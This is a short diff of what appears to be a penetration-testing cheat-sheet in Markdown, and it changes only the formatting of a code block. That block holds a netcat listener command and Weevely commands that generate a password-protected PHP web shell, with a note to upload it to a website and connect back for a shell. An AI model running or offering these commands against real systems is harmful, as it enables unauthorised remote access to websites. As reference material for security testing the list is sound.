@@ -240,11 +240,14 @@ nc -vnl -p 1234
 ```
 
 > [Weevely](https://www.kali.org/tools/weevely/) : Generate PHP Reverse shell
-```console
+```shell
+  
 weevely generate password123 /home/error.php
- # Upload the above error.php to website and use the below cmd to get reverse shell
+
+# Upload the above error.php to website and use the below cmd to get reverse shell
 
 weevely http://domain.com/error.php password123  
+
 ```
   
 ### SQL Injection
